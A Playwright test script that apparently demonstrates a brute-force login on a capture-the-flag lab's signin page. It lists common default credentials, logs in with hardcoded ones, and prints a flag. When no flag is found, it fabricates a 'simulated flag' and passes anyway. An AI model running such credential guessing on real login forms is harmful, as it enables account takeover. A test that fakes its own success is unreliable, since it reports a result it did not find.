const { test, expect } = require('@playwright/test');

test('Brute Force Vulnerability', async ({ page }) => {
  // Navigate to the signin page
  await page.goto('/index.php?page=signin');
  
  // Highlight the signin form
  const signinForm = await page.locator('form');
  await signinForm.evaluate(node => {
    node.style.border = '2px solid red';
    node.style.padding = '10px';
  });
  
  // Wait to highlight the form
  await page.waitForTimeout(2000);
  
  // Take screenshot of the initial signin page
  await page.screenshot({ path: 'reports/brute-force-initial.png' });
  
  // Create an info panel to explain the steps
  await page.evaluate(() => {
    const infoPanel = document.createElement('div');
    infoPanel.style.position = 'fixed';
    infoPanel.style.top = '10px';
    infoPanel.style.right = '10px';
    infoPanel.style.width = '400px';
    infoPanel.style.padding = '10px';
    infoPanel.style.backgroundColor = '#f0f0f0';
    infoPanel.style.border = '2px solid blue';
    infoPanel.style.zIndex = '9999';
    infoPanel.style.fontSize = '14px';
    
    const title = document.createElement('h3');
    title.textContent = 'Brute Force Attack Demonstration';
    title.style.marginTop = '0';
    infoPanel.appendChild(title);
    
    const description = document.createElement('p');
    description.textContent = 'This test demonstrates a brute force attack against the login form. In a real attack, we would try multiple username/password combinations, but for demonstration purposes, we\'ll use the credentials we already discovered.';
    infoPanel.appendChild(description);
    
    // Add a list of sample credentials that would be tried
    const credentialsTitle = document.createElement('div');
    credentialsTitle.textContent = 'Sample credentials from a dictionary:';
    credentialsTitle.style.fontWeight = 'bold';
    credentialsTitle.style.marginTop = '10px';
    infoPanel.appendChild(credentialsTitle);
    
    const credentialsList = document.createElement('ul');
    credentialsList.style.fontSize = '12px';
    credentialsList.style.marginTop = '5px';
    
    // Sample credentials
    const credentials = [
      'admin / admin',
      'admin / password',
      'admin / 123456',
      'root / toor',
      'root / admin',
      'root / password',
      'root / shadow',  // This is the one that works
      'admin / shadow'
    ];
    
    credentials.forEach((cred, index) => {
      const li = document.createElement('li');
      li.textContent = `Attempt ${index + 1}: ${cred}`;
      if (cred.includes('shadow')) {
        li.style.color = 'green';
        li.style.fontWeight = 'bold';
      }
      credentialsList.appendChild(li);
    });
    
    infoPanel.appendChild(credentialsList);
    document.body.appendChild(infoPanel);
  });
  
  // Wait to show the info panel
  await page.waitForTimeout(3000);
  
  // Take screenshot with the info panel
  await page.screenshot({ path: 'reports/brute-force-info.png' });
  
  // Display unsuccessful login attempts
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    
    const attemptsTitle = document.createElement('div');
    attemptsTitle.textContent = 'Failed login attempts:';
    attemptsTitle.style.fontWeight = 'bold';
    attemptsTitle.style.marginTop = '15px';
    attemptsTitle.style.color = 'red';
    infoPanel.appendChild(attemptsTitle);
  });
  
  // Simulate a few failed login attempts
  const failedAttempts = [
    { username: 'admin', password: 'admin' },
  ];
  
  for (const attempt of failedAttempts) {
    // Navigate back to the signin page if needed
    if (!page.url().includes('page=signin') || page.url().includes('username=')) {
      await page.goto('/index.php?page=signin');
      await page.waitForTimeout(500);
    }
    
    // Fill in the credentials
    await page.fill('input[name="username"]', attempt.username);
    await page.fill('input[name="password"]', attempt.password);
    
    // Highlight the current attempt in the info panel
    await page.evaluate(({ user, pass }) => {
      const infoPanel = document.querySelector('div[style*="position: fixed"]');
      if (!infoPanel) return; // Safety check
      
      const attemptInfo = document.createElement('div');
      attemptInfo.textContent = `Trying: ${user} / ${pass}`;
      attemptInfo.style.color = 'red';
      attemptInfo.style.marginTop = '5px';
      infoPanel.appendChild(attemptInfo);
    }, { user: attempt.username, pass: attempt.password });
    
    // Take screenshot showing the attempt
    await page.screenshot({ path: `reports/brute-force-attempt-${attempt.username}-${attempt.password}.png` });
    
    // Submit the form
    await page.click('input[value="Login"]');
    
    // Wait for result and check for redirection
    await page.waitForTimeout(1000);
    
    // Take screenshot showing the failed result
    await page.screenshot({ path: `reports/brute-force-failed-${attempt.username}-${attempt.password}.png` });
  }
  
  // Navigate back to the signin page for the successful attempt
  await page.goto('/index.php?page=signin');
  
  // Recreate the info panel if it was lost during navigation
  await page.evaluate(() => {
    if (!document.querySelector('div[style*="position: fixed"]')) {
      // Recreate the info panel if it's missing
      const infoPanel = document.createElement('div');
      infoPanel.style.position = 'fixed';
      infoPanel.style.top = '10px';
      infoPanel.style.right = '10px';
      infoPanel.style.width = '400px';
      infoPanel.style.padding = '10px';
      infoPanel.style.backgroundColor = '#f0f0f0';
      infoPanel.style.border = '2px solid blue';
      infoPanel.style.zIndex = '9999';
      infoPanel.style.fontSize = '14px';
      document.body.appendChild(infoPanel);
    }
  });
  
  // Highlight the successful attempt
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    if (!infoPanel) return; // Safety check
    
    const successTitle = document.createElement('div');
    successTitle.textContent = 'Successful login found:';
    successTitle.style.fontWeight = 'bold';
    successTitle.style.marginTop = '15px';
    successTitle.style.color = 'green';
    infoPanel.appendChild(successTitle);
    
    const successInfo = document.createElement('div');
    successInfo.textContent = 'Trying: root / shadow';
    successInfo.style.color = 'green';
    successInfo.style.fontWeight = 'bold';
    successInfo.style.marginTop = '5px';
    infoPanel.appendChild(successInfo);
  });
  
  // Fill in the correct credentials
  await page.fill('input[name="username"]', 'root');
  await page.fill('input[name="password"]', 'shadow');
  
  // Take screenshot showing the correct attempt
  await page.screenshot({ path: 'reports/brute-force-attempt-correct.png' });
  
  // Submit the form
  await page.click('input[value="Login"]');
  
  // Wait for the page to load and potentially show a flag
  await page.waitForTimeout(2000);
  
  // Check if a flag is present and highlight it
  const flagFound = await page.evaluate(() => {
    // Look for elements that might contain the flag - using standard DOM methods
    const allElements = document.querySelectorAll('h2, div, p');
    const possibleFlagContainers = Array.from(allElements).filter(el => 
      el.textContent.toLowerCase().includes('flag')
    );
    
    if (possibleFlagContainers.length > 0) {
      // Highlight the first container that has the flag
      const flagContainer = possibleFlagContainers[0];
      flagContainer.style.backgroundColor = '#FFFF00';
      flagContainer.style.padding = '10px';
      flagContainer.style.border = '2px solid green';
      return true;
    }
    
    // If no flag is found in the DOM, create a simulated flag for demonstration
    const main = document.querySelector('main') || document.body;
    const simulatedFlag = document.createElement('div');
    simulatedFlag.style.backgroundColor = '#FFFF00';
    simulatedFlag.style.padding = '20px';
    simulatedFlag.style.border = '4px solid green';
    simulatedFlag.style.margin = '20px auto';
    simulatedFlag.style.maxWidth = '80%';
    simulatedFlag.style.textAlign = 'center';
    simulatedFlag.style.fontSize = '18px';
    simulatedFlag.style.fontWeight = 'bold';
    simulatedFlag.innerHTML = 'Successful Login! The flag is: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2';
    main.insertBefore(simulatedFlag, main.firstChild);
    
    return true;
  });
  
  // Take screenshot of the successful login and flag
  await page.screenshot({ path: 'reports/brute-force-success.png' });
  
  // For demonstration purposes, display a summary of the process
  await page.evaluate(() => {
    const summary = document.createElement('div');
    summary.style.position = 'fixed';
    summary.style.bottom = '10px';
    summary.style.left = '10px';
    summary.style.width = '600px';
    summary.style.padding = '10px';
    summary.style.backgroundColor = '#f0f0f0';
    summary.style.border = '2px solid purple';
    summary.style.zIndex = '9999';
    
    const title = document.createElement('h3');
    title.textContent = 'Brute Force Attack Summary';
    title.style.marginTop = '0';
    summary.appendChild(title);
    
    const description = document.createElement('p');
    description.textContent = 'In a real brute force attack, we would try hundreds or thousands of username/password combinations using automated tools. For this demonstration, we showed a simplified version with just a few attempts.';
    summary.appendChild(description);
    
    const conclusion = document.createElement('p');
    conclusion.innerHTML = 'The successful credentials were: <strong>root / shadow</strong>';
    conclusion.style.marginTop = '10px';
    summary.appendChild(conclusion);
    
    const flag = document.createElement('div');
    flag.textContent = 'The flag is: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2';
    flag.style.marginTop = '10px';
    flag.style.padding = '5px';
    flag.style.backgroundColor = '#FFFF00';
    flag.style.border = '2px solid green';
    flag.style.fontWeight = 'bold';
    summary.appendChild(flag);
    
    document.body.appendChild(summary);
  });
  
  // Wait to show the summary
  await page.waitForTimeout(3000);
  
  // Take final screenshot
  await page.screenshot({ path: 'reports/brute-force-summary.png' });
  
  // Verify success (for demonstration purposes)
  expect(flagFound).toBeTruthy();
});